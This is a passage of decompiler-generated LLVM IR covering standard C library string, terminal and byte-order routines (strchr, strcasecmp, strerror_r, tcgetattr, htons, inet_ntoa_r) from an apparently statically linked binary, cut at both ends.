  uselistorder label %dec_label_pc_145a8, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_14580, { 1, 0 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_145b4 = urem i32 %arg1, 256
  %v0_145d43 = load i32, i32* @r0, align 4
  %v1_145d44 = urem i32 %v0_145d43, 4
  %v2_145d45 = icmp eq i32 %v1_145d44, 0
  br i1 %v2_145d45, label %dec_label_pc_145dc, label %dec_label_pc_145bc

dec_label_pc_145bc:                               ; preds = %entry, %dec_label_pc_145d0
  %v0_145d0 = phi i32 [ %v1_145d0, %dec_label_pc_145d0 ], [ %v0_145d43, %entry ]
  %v1_145bc = inttoptr i32 %v0_145d0 to i8*
  %v2_145bc = load i8, i8* %v1_145bc, align 1
  %v3_145bc = zext i8 %v2_145bc to i32
  store i32 %v3_145bc, i32* @r3, align 4
  %v9_145c0 = icmp eq i32 %v3_145bc, %v1_145b4
  br i1 %v9_145c0, label %dec_label_pc_14690, label %dec_label_pc_145c8

dec_label_pc_145c8:                               ; preds = %dec_label_pc_145bc
  %v2_145c8 = icmp eq i8 %v2_145bc, 0
  br i1 %v2_145c8, label %dec_label_pc_1468c, label %dec_label_pc_145d0

dec_label_pc_145d0:                               ; preds = %dec_label_pc_145c8
  %v1_145d0 = add i32 %v0_145d0, 1
  %v1_145d4 = urem i32 %v1_145d0, 4
  %v2_145d4 = icmp eq i32 %v1_145d4, 0
  br i1 %v2_145d4, label %dec_label_pc_145dc, label %dec_label_pc_145bc

dec_label_pc_145dc:                               ; preds = %dec_label_pc_145d0, %entry
  %v0_145e0 = phi i32 [ %v0_145d43, %entry ], [ %v1_145d0, %dec_label_pc_145d0 ]
  %v4_145dc = mul nuw nsw i32 %v1_145b4, 256
  %v5_145dc = or i32 %v4_145dc, %v1_145b4
  %v4_145e4 = mul i32 %v5_145dc, 65536
  %v5_145e4 = or i32 %v4_145e4, %v5_145dc
  br label %dec_label_pc_145e8

dec_label_pc_145e8:                               ; preds = %dec_label_pc_14684, %dec_label_pc_14624, %dec_label_pc_145dc
  %v0_1464c = phi i32 [ %v0_145e0, %dec_label_pc_145dc ], [ %v4_145e8, %dec_label_pc_14624 ], [ %v4_145e8, %dec_label_pc_14684 ]
  %v1_145e8 = inttoptr i32 %v0_1464c to i32*
  %v2_145e8 = load i32, i32* %v1_145e8, align 4
  %v4_145e8 = add i32 %v0_1464c, 4
  %v2_145f0 = xor i32 %v2_145e8, %v5_145e4
  %v2_145f4 = add i32 %v2_145f0, 2130640639
  store i32 %v2_145f4, i32* @ip, align 4
  %v2_145fc = add i32 %v2_145e8, 2130640639
  %v1_14600 = sub i32 -1, %v2_145e8
  %v2_14604 = xor i32 %v2_145fc, %v1_14600
  %v2_14610 = and i32 %v2_14604, -2130640640
  %v2_14618 = icmp eq i32 %v2_14610, 0
  br i1 %v2_14618, label %dec_label_pc_14624, label %dec_label_pc_1462c

dec_label_pc_14624:                               ; preds = %dec_label_pc_145e8
  %v1_1460c = sub i32 -1, %v2_145f0
  %v2_14614 = xor i32 %v2_145f4, %v1_1460c
  %v2_1461c = and i32 %v2_14614, -2130640640
  %v2_14624 = icmp eq i32 %v2_1461c, 0
  br i1 %v2_14624, label %dec_label_pc_145e8, label %dec_label_pc_1462c

dec_label_pc_1462c:                               ; preds = %dec_label_pc_145e8, %dec_label_pc_14624
  %v2_1462c = inttoptr i32 %v0_1464c to i8*
  %v3_1462c = load i8, i8* %v2_1462c, align 1
  %v4_1462c = zext i8 %v3_1462c to i32
  store i32 %v4_1462c, i32* @r3, align 4
  %v9_14630 = icmp eq i32 %v4_1462c, %v1_145b4
  br i1 %v9_14630, label %dec_label_pc_14690, label %dec_label_pc_1463c

dec_label_pc_1463c:                               ; preds = %dec_label_pc_1462c
  %v2_1463c = icmp eq i8 %v3_1462c, 0
  br i1 %v2_1463c, label %dec_label_pc_1468c, label %dec_label_pc_14644

dec_label_pc_14644:                               ; preds = %dec_label_pc_1463c
  %v1_14644 = add i32 %v0_1464c, 1
  %v2_14644 = inttoptr i32 %v1_14644 to i8*
  %v3_14644 = load i8, i8* %v2_14644, align 1
  %v4_14644 = zext i8 %v3_14644 to i32
  store i32 %v4_14644, i32* @r3, align 4
  %v9_14648 = icmp eq i32 %v4_14644, %v1_145b4
  br i1 %v9_14648, label %dec_label_pc_14690, label %dec_label_pc_14654

dec_label_pc_14654:                               ; preds = %dec_label_pc_14644
  %v2_14654 = icmp eq i8 %v3_14644, 0
  br i1 %v2_14654, label %dec_label_pc_1468c, label %dec_label_pc_1465c

dec_label_pc_1465c:                               ; preds = %dec_label_pc_14654
  %v1_1465c = add i32 %v0_1464c, 2
  %v2_1465c = inttoptr i32 %v1_1465c to i8*
  %v3_1465c = load i8, i8* %v2_1465c, align 1
  %v4_1465c = zext i8 %v3_1465c to i32
  store i32 %v4_1465c, i32* @r3, align 4
  %v9_14660 = icmp eq i32 %v4_1465c, %v1_145b4
  br i1 %v9_14660, label %dec_label_pc_14690, label %dec_label_pc_1466c

dec_label_pc_1466c:                               ; preds = %dec_label_pc_1465c
  %v2_1466c = icmp eq i8 %v3_1465c, 0
  br i1 %v2_1466c, label %dec_label_pc_1468c, label %dec_label_pc_14674

dec_label_pc_14674:                               ; preds = %dec_label_pc_1466c
  %v1_14674 = add i32 %v0_1464c, 3
  %v2_14674 = inttoptr i32 %v1_14674 to i8*
  %v3_14674 = load i8, i8* %v2_14674, align 1
  %v4_14674 = zext i8 %v3_14674 to i32
  store i32 %v4_14674, i32* @r3, align 4
  %v9_14678 = icmp eq i32 %v4_14674, %v1_145b4
  br i1 %v9_14678, label %dec_label_pc_14690, label %dec_label_pc_14684

dec_label_pc_14684:                               ; preds = %dec_label_pc_14674
  %v2_14684 = icmp eq i8 %v3_14674, 0
  br i1 %v2_14684, label %dec_label_pc_1468c, label %dec_label_pc_145e8

dec_label_pc_1468c:                               ; preds = %dec_label_pc_145c8, %dec_label_pc_14684, %dec_label_pc_1466c, %dec_label_pc_14654, %dec_label_pc_1463c
  br label %dec_label_pc_14690

dec_label_pc_14690:                               ; preds = %dec_label_pc_145bc, %dec_label_pc_14674, %dec_label_pc_1465c, %dec_label_pc_14644, %dec_label_pc_1462c, %dec_label_pc_1468c
  %v1_14694 = phi i32 [ 0, %dec_label_pc_1468c ], [ %v1_14674, %dec_label_pc_14674 ], [ %v1_1465c, %dec_label_pc_1465c ], [ %v1_14644, %dec_label_pc_14644 ], [ %v0_1464c, %dec_label_pc_1462c ], [ %v0_145d0, %dec_label_pc_145bc ]
  ret i32 %v1_14694

; uselistorder directives
  uselistorder i32 %v4_145e8, { 1, 0 }
  uselistorder i32 %v2_145e8, { 0, 2, 1 }
  uselistorder i32 %v0_1464c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_145dc, { 1, 0 }
  uselistorder i32 %v1_145d0, { 1, 0, 2 }
  uselistorder i32 %v0_145d43, { 2, 1, 0 }
  uselistorder i32 %v1_145b4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_14690, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1468c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1462c, { 1, 0 }
  uselistorder label %dec_label_pc_145bc, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_146a8 = call i32 @__xpg_strerror_r()
  %v0_146ac = load i32, i32* @r4, align 4
  ret i32 %v0_146ac
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 26004), i32* @r2, align 4
  %v0_146d0 = call i32 @strtok_r()
  ret i32 %v0_146d0
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @ip, align 4
  br label %dec_label_pc_14704

dec_label_pc_14704:                               ; preds = %dec_label_pc_14730, %entry
  %v1_147488 = phi i32 [ %v1_147489, %dec_label_pc_14730 ], [ 0, %entry ]
  %v0_14738 = phi i32 [ %v1_14738, %dec_label_pc_14730 ], [ %arg2, %entry ]
  %v0_1473c = phi i32 [ %v1_1473c, %dec_label_pc_14730 ], [ %tmp, %entry ]
  %v9_14704 = icmp eq i32 %v0_1473c, %v0_14738
  %.pre = inttoptr i32 %v0_1473c to i8*
  br i1 %v9_14704, label %dec_label_pc_14730, label %dec_label_pc_1470c

dec_label_pc_1470c:                               ; preds = %dec_label_pc_14704
  %v2_1470c = load i8, i8* %.pre, align 1
  %v3_1470c = zext i8 %v2_1470c to i32
  %v1_14710 = inttoptr i32 %v0_14738 to i8*
  %v2_14710 = load i8, i8* %v1_14710, align 1
  %v3_14710 = zext i8 %v2_14710 to i32
  %v4_14714 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 1336) to i32*), align 4
  %v2_14718 = mul nuw nsw i32 %v3_14710, 2
  %v2_1471c = mul nuw nsw i32 %v3_1470c, 2
  %v2_14720 = add i32 %v4_14714, %v2_14718
  %v3_14720 = inttoptr i32 %v2_14720 to i16*
  %v4_14720 = load i16, i16* %v3_14720, align 2
  %v6_14720 = sext i16 %v4_14720 to i32
  %v2_14724 = add i32 %v4_14714, %v2_1471c
  %v3_14724 = inttoptr i32 %v2_14724 to i16*
  %v4_14724 = load i16, i16* %v3_14724, align 2
  %v6_14724 = sext i16 %v4_14724 to i32
  %v2_14728 = sub nsw i32 %v6_14724, %v6_14720
  %v9_14728 = icmp eq i16 %v4_14724, %v4_14720
  br i1 %v9_14728, label %dec_label_pc_14730, label %dec_label_pc_14744

dec_label_pc_14730:                               ; preds = %dec_label_pc_14704, %dec_label_pc_1470c
  %v1_147489 = phi i32 [ %v2_14728, %dec_label_pc_1470c ], [ %v1_147488, %dec_label_pc_14704 ]
  %v2_14730 = load i8, i8* %.pre, align 1
  %v2_14734 = icmp eq i8 %v2_14730, 0
  %v1_14738 = add i32 %v0_14738, 1
  %v1_1473c = add i32 %v0_1473c, 1
  store i32 %v1_1473c, i32* @ip, align 4
  br i1 %v2_14734, label %dec_label_pc_14744, label %dec_label_pc_14704

dec_label_pc_14744:                               ; preds = %dec_label_pc_14730, %dec_label_pc_1470c
  %v1_14748 = phi i32 [ %v1_147489, %dec_label_pc_14730 ], [ %v2_14728, %dec_label_pc_1470c ]
  ret i32 %v1_14748

; uselistorder directives
  uselistorder i32 %v1_1473c, { 1, 0 }
  uselistorder i32 %v2_14728, { 1, 0 }
  uselistorder i32 %v0_1473c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14730, { 1, 0 }
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_14754 = load i32, i32* @r4, align 4
  %v9_14754 = load i32, i32* @r6, align 4
  %v0_1475c = load i32, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r6, align 4
  store i32 %v0_1475c, i32* @ip, align 4
  %v0_1476c = load i32, i32* @r1, align 4
  store i32 %v0_1476c, i32* @r7, align 4
  %v0_14770 = load i32, i32* @r2, align 4
  store i32 %v0_14770, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_1475c, 124
  br i1 %tmp, label %dec_label_pc_147a8, label %dec_label_pc_14778

dec_label_pc_14778:                               ; preds = %entry
  br label %dec_label_pc_14790

dec_label_pc_14784:                               ; preds = %dec_label_pc_14790
  br i1 %v2_1479c, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_14784
  %v2_14788 = add i32 %v1_147a0, -1
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_14784, %bb
  %v0_147901 = phi i32 [ %v1_147a0, %dec_label_pc_14784 ], [ %v2_14788, %bb ]
  %v1_1478c = add i32 %v0_1478c, 1
  br label %dec_label_pc_14790

dec_label_pc_14790:                               ; preds = %dec_label_pc_14778, %bb15
  %v1_147a0 = phi i32 [ %v0_1475c, %dec_label_pc_14778 ], [ %v0_147901, %bb15 ]
  %v0_1478c = phi i32 [ add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -5264), %dec_label_pc_14778 ], [ %v1_1478c, %bb15 ]
  store i32 %v0_1478c, i32* @r5, align 4
  %v2_14790 = icmp eq i32 %v1_147a0, 0
  %v1_14794 = inttoptr i32 %v0_1478c to i8*
  %v2_14794 = load i8, i8* %v1_14794, align 1
  %v3_14794 = zext i8 %v2_14794 to i32
  store i32 %v3_14794, i32* @r3, align 4
  %v2_1479c = icmp eq i8 %v2_14794, 0
  br i1 %v2_14790, label %dec_label_pc_1479c, label %dec_label_pc_14784

dec_label_pc_1479c:                               ; preds = %dec_label_pc_14790
  br i1 %v2_1479c, label %dec_label_pc_147a8, label %bb16

bb16:                                             ; preds = %dec_label_pc_1479c
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_147e4

dec_label_pc_147a8:                               ; preds = %dec_label_pc_1479c, %entry
  store i32 %v0_1475c, i32* @r2, align 4
  %v3_147b0 = ashr i32 %v0_1475c, 31
  store i32 %v3_147b0, i32* @r3, align 4
  %v6_147c4 = bitcast i32* %stack_var_-25 to i8*
  %v7_147c4 = call i32 @_uintmaxtostr(i8* %v6_147c4)
  %v1_147cc = add i32 %v7_147c4, -14
  store i32 %v1_147cc, i32* @r5, align 4
  %v0_147d0 = load i32, i32* @r6, align 4
  %v2_147d0 = add i32 %v0_147d0, -5280
  store i32 %v2_147d0, i32* @r1, align 4
  store i32 %v1_147cc, i32* @r0, align 4
  store i32 14, i32* @r2, align 4
  %v0_147dc = call i32 @memcpy()
  store i32 22, i32* %r6.global-to-local, align 4
  %v0_147e4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_147e4

dec_label_pc_147e4:                               ; preds = %bb16, %dec_label_pc_147a8
  %v0_147e4 = phi i32 [ %v0_1478c, %bb16 ], [ %v0_147e4.pre, %dec_label_pc_147a8 ]
  %v1_147e4 = inttoptr i32 %v0_147e4 to i8*
  %v3_147e8 = call i32 @strlen(i8* %v1_147e4)
  %v0_147ec = load i32, i32* @r7, align 4
  %v2_147ec = icmp eq i32 %v0_147ec, 0
  br i1 %v2_147ec, label %bb17, label %dec_label_pc_147e4._crit_edge

dec_label_pc_147e4._crit_edge:                    ; preds = %dec_label_pc_147e4
  %v1_147f8.pre = load i32, i32* @r4, align 4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_147e4
  store i32 0, i32* @r4, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_147e4._crit_edge, %bb17
  %v1_147f8 = phi i32 [ %v1_147f8.pre, %dec_label_pc_147e4._crit_edge ], [ 0, %bb17 ]
  %v1_147f4 = add i32 %v3_147e8, 1
  %v3_147f8 = icmp uge i32 %v1_147f4, %v1_147f8
  %v9_147f8 = icmp eq i32 %v1_147f4, %v1_147f8
  %v2_147fc = xor i1 %v3_147f8, true
  %v3_147fc = or i1 %v9_147f8, %v2_147fc
  br i1 %v3_147fc, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 %v1_147f4, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_1480c = phi i32 [ %v1_147f8, %bb18 ], [ %v1_147f4, %bb19 ]
  %v2_14800 = xor i1 %v9_147f8, true
  %v3_14800 = and i1 %v3_147f8, %v2_14800
  br i1 %v3_14800, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 34, i32* %r6.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v2_14804 = icmp eq i32 %v0_1480c, 0
  br i1 %v2_14804, label %dec_label_pc_14828, label %dec_label_pc_1480c

dec_label_pc_1480c:                               ; preds = %bb22
  store i32 %v0_1480c, i32* @r2, align 4
  %v0_14810 = load i32, i32* @r5, align 4
  store i32 %v0_14810, i32* @r1, align 4
  store i32 %v0_147ec, i32* @r0, align 4
  %v0_14818 = call i32 @memcpy()
  %v0_1481c = load i32, i32* @r4, align 4
  %v1_1481c = load i32, i32* @r7, align 4
  %v2_1481c = add i32 %v1_1481c, %v0_1481c
  %v3_14824 = add i32 %v2_1481c, -1
  %v4_14824 = inttoptr i32 %v3_14824 to i8*
  store i8 0, i8* %v4_14824, align 1
  br label %dec_label_pc_14828

dec_label_pc_14828:                               ; preds = %bb22, %dec_label_pc_1480c
  %v0_14828 = load i32, i32* %r6.global-to-local, align 4
  %v2_14828 = icmp eq i32 %v0_14828, 0
  br i1 %v2_14828, label %dec_label_pc_14838, label %dec_label_pc_14830

dec_label_pc_14830:                               ; preds = %dec_label_pc_14828
  %v0_14830 = call i32 @__GI___errno_location()
  %v0_14834 = load i32, i32* %r6.global-to-local, align 4
  %v2_14834 = inttoptr i32 %v0_14830 to i32*
  store i32 %v0_14834, i32* %v2_14834, align 4
  %v0_14838.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14838

dec_label_pc_14838:                               ; preds = %dec_label_pc_14828, %dec_label_pc_14830
  %v0_14838 = phi i32 [ 0, %dec_label_pc_14828 ], [ %v0_14838.pre, %dec_label_pc_14830 ]
  store i32 %v3_14754, i32* @r4, align 4
  store i32 %v9_14754, i32* %r6.global-to-local, align 4
  ret i32 %v0_14838

; uselistorder directives
  uselistorder i1 %v3_147f8, { 1, 0 }
  uselistorder i32 %v0_1478c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_147a0, { 1, 0, 2 }
  uselistorder i32 %v0_1475c, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 3, 4, 5, 1, 2, 6 }
  uselistorder label %dec_label_pc_14838, { 1, 0 }
  uselistorder label %dec_label_pc_14828, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_147e4, { 1, 0 }
  uselistorder label %dec_label_pc_14790, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_14860 = load i32, i32* %r0.global-to-local, align 4
  %v1_1487423 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_14874.outer

dec_label_pc_14874.outer:                         ; preds = %dec_label_pc_148b4, %entry
  %v0_148b4.ph = phi i32 [ %v1_148b4, %dec_label_pc_148b4 ], [ %v0_14860, %entry ]
  %v2_1487424 = load i8, i8* %v1_1487423, align 1
  %v2_1487826 = icmp eq i8 %v2_1487424, 0
  br i1 %v2_1487826, label %bb, label %dec_label_pc_1488c

bb:                                               ; preds = %dec_label_pc_14874.backedge, %dec_label_pc_14874.outer
  store i32 %v0_148b4.ph, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_148c8

dec_label_pc_1488c:                               ; preds = %dec_label_pc_14874.outer, %dec_label_pc_14874.backedge
  %v1_1488032.in = phi i32 [ %v1_1488032, %dec_label_pc_14874.backedge ], [ %arg2, %dec_label_pc_14874.outer ]
  %v2_1487430 = phi i8 [ %v2_14874, %dec_label_pc_14874.backedge ], [ %v2_1487424, %dec_label_pc_14874.outer ]
  %v2_1487c31.in.in = phi i8 [ %v2_14874, %dec_label_pc_14874.backedge ], [ %v2_1487424, %dec_label_pc_14874.outer ]
  %v0_1489829 = phi i32 [ %v1_14898, %dec_label_pc_14874.backedge ], [ %v0_148b4.ph, %dec_label_pc_14874.outer ]
  %v1_1488032 = add i32 %v1_1488032.in, 1
  %v1_1488c = inttoptr i32 %v0_1489829 to i8*
  %v2_1488c = load i8, i8* %v1_1488c, align 1
  %v3_1488c = zext i8 %v2_1488c to i32
  store i32 %v3_1488c, i32* %r0.global-to-local, align 4
  %v9_14890 = icmp eq i8 %v2_1487430, %v2_1488c
  %v1_14898 = add i32 %v0_1489829, 1
  br i1 %v9_14890, label %dec_label_pc_14874.backedge, label %dec_label_pc_148a0

dec_label_pc_14874.backedge:                      ; preds = %dec_label_pc_1488c, %dec_label_pc_148a0
  %v1_14874 = inttoptr i32 %v1_1488032 to i8*
  %v2_14874 = load i8, i8* %v1_14874, align 1
  %v2_14878 = icmp eq i8 %v2_14874, 0
  br i1 %v2_14878, label %bb, label %dec_label_pc_1488c

dec_label_pc_148a0:                               ; preds = %dec_label_pc_1488c
  %v2_1487c31.in = zext i8 %v2_1487c31.in.in to i32
  %v2_14894 = mul nuw nsw i32 %v3_1488c, 2
  %v2_1487c31 = mul nuw nsw i32 %v2_1487c31.in, 2
  %v4_148a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 1336) to i32*), align 4
  %v2_148a4 = add i32 %v4_148a0, %v2_14894
  %v3_148a4 = inttoptr i32 %v2_148a4 to i16*
  %v4_148a4 = load i16, i16* %v3_148a4, align 2
  %v2_148a8 = add i32 %v4_148a0, %v2_1487c31
  %v3_148a8 = inttoptr i32 %v2_148a8 to i16*
  %v4_148a8 = load i16, i16* %v3_148a8, align 2
  %v9_148ac = icmp eq i16 %v4_148a8, %v4_148a4
  br i1 %v9_148ac, label %dec_label_pc_14874.backedge, label %dec_label_pc_148b4

dec_label_pc_148b4:                               ; preds = %dec_label_pc_148a0
  %v1_148b4 = add i32 %v0_148b4.ph, 1
  %v2_148b8 = icmp eq i8 %v2_1488c, 0
  br i1 %v2_148b8, label %dec_label_pc_148c8, label %dec_label_pc_14874.outer

dec_label_pc_148c8:                               ; preds = %dec_label_pc_148b4, %bb
  %v1_148cc = phi i32 [ %v0_148b4.ph, %bb ], [ 0, %dec_label_pc_148b4 ]
  ret i32 %v1_148cc

; uselistorder directives
  uselistorder i8 %v2_14874, { 2, 1, 0 }
  uselistorder i32 %v0_1489829, { 1, 0 }
  uselistorder i32 %v0_148b4.ph, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_14874.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1488c, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_148e0 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_148e0, i32* @r1, align 4
  %v0_148e4 = call i32 @__GI_tcgetattr()
  %v1_148e8 = sub i32 1, %v0_148e4
  %v2_148e8 = icmp ult i32 %v0_148e4, 2
  br i1 %v2_148e8, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_148f8 = phi i32 [ %v1_148e8, %entry ], [ 0, %bb ]
  ret i32 %v1_148f8

; uselistorder directives
  uselistorder i32 %v0_148e4, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_148fc = load i32, i32* @r4, align 4
  %v6_148fc = load i32, i32* @r5, align 4
  %v2_14904 = ptrtoint i32* %stack_var_-52 to i32
  %v0_14908 = load i32, i32* @r1, align 4
  store i32 %v0_14908, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_14914 = load i32, i32* @r0, align 4
  %v3_14914 = call i32 @ioctl(i32 %v0_14914, i32 21505, i32 %v2_14904)
  store i32 %v3_14914, i32* %r0.global-to-local, align 4
  store i32 %v3_14914, i32* @r5, align 4
  %v2_14918 = icmp eq i32 %v3_14914, 0
  br i1 %v2_14918, label %dec_label_pc_14920, label %dec_label_pc_14964

dec_label_pc_14920:                               ; preds = %entry
  %v4_1492c = zext i8 %tmp to i32
  store i32 %v4_1492c, i32* @ip, align 4
  %v3_14930 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_14930, i32* @r3, align 4
  %v1_14934 = load i32, i32* @r4, align 4
  %v2_14934 = add i32 %v1_14934, 4
  %v3_14934 = inttoptr i32 %v2_14934 to i32*
  %v0_14938 = load i32, i32* %r1.global-to-local, align 4
  %v1_14938 = load i32, i32* @r4, align 4
  %v2_14938 = add i32 %v1_14938, 8
  %v3_14938 = inttoptr i32 %v2_14938 to i32*
  store i32 %v0_14938, i32* %v3_14938, align 4
  %v0_1493c = load i32, i32* %r0.global-to-local, align 4
  %v1_1493c = load i32, i32* @r4, align 4
  %v2_1493c = add i32 %v1_1493c, 12
  %v3_1493c = inttoptr i32 %v2_1493c to i32*
  store i32 %v0_1493c, i32* %v3_1493c, align 4
  %v2_14940 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_14940, i32* @r1, align 4
  %v1_14948 = load i32, i32* @r4, align 4
  %v2_14948 = inttoptr i32 %v1_14948 to i32*
  store i32 %v3_14930, i32* %v2_14948, align 4
  %v0_1494c = load i32, i32* @ip, align 4
  %v1_1494c = trunc i32 %v0_1494c to i8
  %v2_1494c = load i32, i32* @r4, align 4
  %v3_1494c = add i32 %v2_1494c, 16
  %v4_1494c = inttoptr i32 %v3_1494c to i8*
  store i8 %v1_1494c, i8* %v4_1494c, align 1
  %v0_14950 = load i32, i32* @r4, align 4
  %v1_14950 = add i32 %v0_14950, 17
  store i32 %v1_14950, i32* %r0.global-to-local, align 4
  %v4_14954 = call i32 @__GI_mempcpy(i32 %v1_14950, i32 %v2_14940, i32 19, i32 %v3_14930)
  store i32 %v4_14954, i32* %r0.global-to-local, align 4
  %v0_14958 = load i32, i32* @r5, align 4
  store i32 %v0_14958, i32* %r1.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_14960 = inttoptr i32 %v4_14954 to i8*
  %v3_14960 = call i32 @__GI_memset(i8* %v2_14960, i32 %v0_14958)
  store i32 %v3_14960, i32* %r0.global-to-local, align 4
  %v0_14964.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14964

dec_label_pc_14964:                               ; preds = %entry, %dec_label_pc_14920
  %v0_14964 = phi i32 [ %v3_14914, %entry ], [ %v0_14964.pre, %dec_label_pc_14920 ]
  store i32 %v0_14964, i32* %r0.global-to-local, align 4
  store i32 %v3_148fc, i32* @r4, align 4
  store i32 %v6_148fc, i32* @r5, align 4
  ret i32 %v0_14964

; uselistorder directives
  uselistorder i32 %v0_14964, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder label %dec_label_pc_14964, { 1, 0 }
}

define i32 @__GI_htons(i32 %arg1) local_unnamed_addr {
entry:
  %v3_14978 = udiv i32 %arg1, 256
  %v1_1497c = mul i32 %arg1, 256
  %v4_14980 = and i32 %v1_1497c, 65280
  %v5_14980 = or i32 %v4_14980, %v3_14978
  ret i32 %v5_14980
}

define i32 @__GI_htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_149a0 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_149a0
}

define i32 @__GI_ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v3_149a8 = udiv i32 %arg1, 256
  %v1_149ac = mul i32 %arg1, 256
  %v4_149b0 = and i32 %v1_149ac, 65280
  %v5_149b0 = or i32 %v4_149b0, %v3_149a8
  ret i32 %v5_149b0
}

define i32 @__GI_ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_149d0 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_149d0
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %v3_149d8 = load i32, i32* @r4, align 4
  %v6_149d8 = load i32, i32* @r5, align 4
  %v9_149d8 = load i32, i32* @r6, align 4
  %v12_149d8 = load i32, i32* @r7, align 4
  %v15_149d8 = load i32, i32* @r8, align 4
  %v18_149d8 = load i32, i32* @sb, align 4
  %v21_149d8 = load i32, i32* @sl, align 4
  %v24_149d8 = load i32, i32* @fp, align 4
  %v0_149dc = load i32, i32* @r0, align 4
  %v5_149f8 = call i32 @llvm.bswap.i32(i32 %v0_149dc)
  %v0_149fc = load i32, i32* @r1, align 4
  %v1_149fc = add i32 %v0_149fc, 15
  store i32 %v1_149fc, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 255, i32* @r7, align 4
  store i32 46, i32* @sl, align 4
  br label %dec_label_pc_14a38

dec_label_pc_14a1c:                               ; preds = %dec_label_pc_14a38
  %v1_14a24 = inttoptr i32 %v0_14a54 to i8*
  %v2_14a24 = call i32 @_uintmaxtostr(i8* %v1_14a24)
  %v0_14a28 = load i32, i32* @r6, align 4
  %v2_14a28 = icmp eq i32 %v0_14a28, 0
  %v1_14a2c = add i32 %v2_14a24, -1
  store i32 %v1_14a2c, i32* %r1.global-to-local, align 4
  br i1 %v2_14a28, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_14a1c
  %v1_14a30 = load i32, i32* @sl, align 4
  %v2_14a30 = trunc i32 %v1_14a30 to i8
  %v4_14a30 = inttoptr i32 %v0_14a28 to i8*
  store i8 %v2_14a30, i8* %v4_14a30, align 1
  %v0_14a34.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_14a1c, %bb
